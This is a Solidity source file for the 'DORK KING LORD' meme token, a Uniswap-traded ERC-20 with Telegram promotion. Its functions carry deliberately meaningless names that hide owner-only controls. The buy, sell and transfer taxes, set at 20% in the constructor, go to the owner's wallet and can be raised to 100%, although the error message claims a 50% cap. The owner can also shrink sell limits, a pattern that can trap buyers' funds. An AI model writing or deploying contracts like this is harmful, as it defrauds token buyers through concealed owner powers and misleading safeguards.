// SPDX-License-Identifier: No License

/* 

.........................................................................................=
.........................................................................................-
.........................................................................................-
..................................::::...................................................-
............................:=*#%@%%%%%%##+=:............................................-
..................::--====+#@%%%############%%#+==----==++=-:............................-
...............:-=++++++#%@%%%%#########*##*##**#####**#######*=:........................-
.............:=++++++*#@%%%#%%%%##%#%#########*****#********##*##*=......................-
...........:=+++++*#%@%%%%#%%%%%%%%%%%%%%%%%#####**#*******#########=....................-
.........:=+++++#%@%%%%%%%%%%%%%%%###%%#%%#%%%%#######****#***#######%+:.................-
.......:=+++++#@@%%%%%%%%%%%%################*#########%%############%%%*-...............-
.....:-+++++#@@%%%%#%%%%%####%%%%##%%#########################*##***#######+=-:..........-
...:-+++++*%@@%%%%%%%%%##%%%%%%%%%%%%@@@%%%%%%%%%%%%#########%%%%%#%############+........-
..-++++++%@%%@%%%%%%%%##%%%%@%%#####%%%%######%%%%%%%%%@%%@%%%%%%%%%%%%%%%%%%@%###-......-
.=++++++%@@%%@@%%%%%%##%%@@%#*+*+**##**##################%%@%%%%%%%###########%%##%:.....-
=++++++#@@%%%@@%%%%%%%%%@%*+##*++*####%%###%@%%%%%%%%*+*#%##%#####%%%@%#*++**##*%#%+.....-
+++++++%@%%@%%%%%%%@%%%%@#+-==+#%@##***=--+%%%%%%%%%%%:::-=%%##@%%%%%%%%=:::::-#@%%#.....-
++++=+*@@%@%%@%%%%%@%%%%@#*######%%##%#=::-%%%%%%%%%%#:::::*==*%%%%%%%%%=::::::=%%#*.....-
+====+#@@@@@@@%%%%@%%%%%%*=+*#*##****#%%%*=+#%%%%%%%*::::=**---#%%%%%%%+:::::=*@%%%+.....-
++=+++#@@@@@@@%%%%@%%%%%#*#**++=*#**+++*#####%%%#*+==+*####%%#**#%%%%#*++**##%%%##%-.....-
+====+*@@@@@@%%%%@%%%%%%#*#**+=---*##+===++*##########***+--*%#############%@%@%%%*......-
+++=++*@@@@@%%%%@@##%%#%+=--==+**+--=*##*++==++**###*=--=:...**+++++++++*##@%%%%#%-......-
+++++++@@@@%%%%@@##%%%##-=====++--+++---=+++*+++==---++=::...-#*++++****+:=%%@##%%:......-
+++++++%@@%%%%@@###%%#%-++=---::++:-=+***++===++++**+=---::....+#*++====+**%%@###%:......-
++++=++#@%%%@@@%##%%#*#-++=:=+=-:-===*+=--------=*+=:..---:::...=#===--==::*@@###%.......-
+=++++*%%%%@@@%#######=:#+=-:+#+==--:.-++++==++*#+-:.:++=------=-::....-*-.-%@%%%@.......-
++++++@%%%@@@@#%%%#*#-.+*#+=-::-=**+=---:::-+***++==+**+=====+#*=--::-+#***+#@@%%%:......-
+++++*%%%@@@@%%%%###-:++-###+=-::::=+***==---::--===++++***++==--====--::.::-@@%%%:......-
+++++%%%%@@%%%%%#%@#-++::#++**===--::::-+****+==-----::::::----==--------==+#@@%%@:......-
+++++#%%%@%%%%%%@@@@#==-++==:=%#**++=---:::::-=+*****+++++++***++++****++===*@@%%%=......-
++++++%%%%#%%%%@@@@@@%*=-=-:.:#*+==+***++=++=---::::--===-:::::::::::::-----+@@@%%#......-
++++++##%%##%##@@@@@@@@@%*+--++=-::::-*###*******++****+====++**+*++++##%%%@@@@%%%*......-
++++++*%%%#%%%#%@@@@@%%@%%%%%%*+=--=+++==-:..:+*#**=--=+*#%#*+=--=+*%@@@%%%%%@@%%%=......-
+++*%@@@@@@%%####%@@@@@@%%%%%@@@@@%#*+-=---=+*++=:...-+**++=-:::=#%@%%%%%%%%@@%%%%.......-
+#@@%%%@@@%%@@%#%###%@@@@@%%%%%%%%%%%@%*+++**##**+=-===+#######%@%%%%%%%%%%@@%#%#:.......-
@@%%%%@@@%%%%@@@##%%###%%%@@@@@@@@%%%%%%%@@%##%##%%%%%##**#@@@@%%%%%%%%%%@@%#%%#.........-
%%%%%%%%%%%%%%@@@%##%%%#****###%%%%@@@@@@@@@@%###*****###########%%%@@@@%%%%#%+..........-
%@%@@%@%%%@%%%%%%%@%*#%%%%##***#*****##%%%%@@@@@%%%%##*###***#******#######%*:...........-
%%#####%%%%%%%%%%%%@%##%%%%%%#######################%%%%####**##*#**####%##-.............-
############*##%%%%@@@@###%%%%%%%%%%%%%%%%%#%%%%%%%%##%%%%%%##########%##%%+.............-
##############***##%%@@@@%###############%%%##%@@%%%@@%%#%%%%%%%%%%%%##%%%%%*............-
##########*#****#####%@@@@%@@%%%%%%%%%%###**##@@@%###%%@@%%###%%#####%%###%%#*...........-
########**#####%%%%##%%@@%%%@@@@@%%%#########@@@@@#######%%%%%%%%%%############..........-
####*##*##%%%%%%%%%%%%%@@%%#%@%%%%%#########%@@@@@%%%%%%%%#######%%%##########%*.........-

https://t.me/DorkKingLord
https://twitter.com/Matt_Furie/status/1699147199496740876?s=20

*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract DKINGLORD is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public ReenergizeArmamentStatSchema;
    uint16[3] public EconomicRapidViewpointExamination;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public IgniteArmamentDesign;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ElucidateBlastProtocols;
    mapping (address => bool) public FloralNetworkGenesis;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event ReenergizeArmamentStatSchemaUpdated(address ReenergizeArmamentStatSchema);
    event ComprehensiveCommerceVibrationAnalysis(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event CorporateAssessmentAnthology(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);	
    event FederationRelaunchRefinements(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"ᗪOᖇK ᏦᏆᏁᏀ ᒪOᖇᗪ", unicode"ᗪOᖇK ᏦᏆᏁᏀ ᒪOᖇᗪ") 
    {
        address supplyRecipient = 0x28fA61399e633372a733FA73BB6Ca4F26D90c0fF;
        
        PinnacleSharpshooterEconomicAbyss(80000000 * (10 ** decimals()) / 10);

        ExpandRocketConstraintFrameworks(0x28fA61399e633372a733FA73BB6Ca4F26D90c0fF);
        FortifySummitVelocityBuyLimit(2000, 2000, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(ReenergizeArmamentStatSchema, true);

        HastyInfernoBaseCostTransmutation(80000000 * (10 ** decimals()) / 10);
        FactionalHarmonyTenets(80000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 10000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0x28fA61399e633372a733FA73BB6Ca4F26D90c0fF);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function PinnacleSharpshooterEconomicAbyss(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function MonetaryAuthenticityValidation() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function ExpandRocketConstraintFrameworks(address _newAddress) public onlyOwner {
        ReenergizeArmamentStatSchema = _newAddress;

        excludeFromFees(_newAddress, true);

        emit ReenergizeArmamentStatSchemaUpdated(_newAddress);
    }

    function FortifySummitVelocityBuyLimit(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        EconomicRapidViewpointExamination = [_buyFee, _sellFee, _transferFee];

        IgniteArmamentDesign[0] = 0 + EconomicRapidViewpointExamination[0];
        IgniteArmamentDesign[1] = 0 + EconomicRapidViewpointExamination[1];
        IgniteArmamentDesign[2] = 0 + EconomicRapidViewpointExamination[2];
        require(IgniteArmamentDesign[0] <= 10000 && IgniteArmamentDesign[1] <= 10000 && IgniteArmamentDesign[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ComprehensiveCommerceVibrationAnalysis(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = MonetaryAuthenticityValidation() >= swapThreshold;
        
        if (!_swapping && !FloralNetworkGenesis[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(ReenergizeArmamentStatSchema)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit CorporateAssessmentAnthology(ReenergizeArmamentStatSchema, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (FloralNetworkGenesis[from]) {
                if (IgniteArmamentDesign[0] > 0) txType = 0;
            }
            else if (FloralNetworkGenesis[to]) {
                if (IgniteArmamentDesign[1] > 0) txType = 1;
            }
            else if (IgniteArmamentDesign[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * IgniteArmamentDesign[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * EconomicRapidViewpointExamination[txType] / IgniteArmamentDesign[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ElucidateBlastProtocols = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ElucidateBlastProtocols, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ElucidateBlastProtocols, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        FloralNetworkGenesis[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit FederationRelaunchRefinements(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function HastyInfernoBaseCostTransmutation(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function FactionalHarmonyTenets(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (FloralNetworkGenesis[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (FloralNetworkGenesis[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}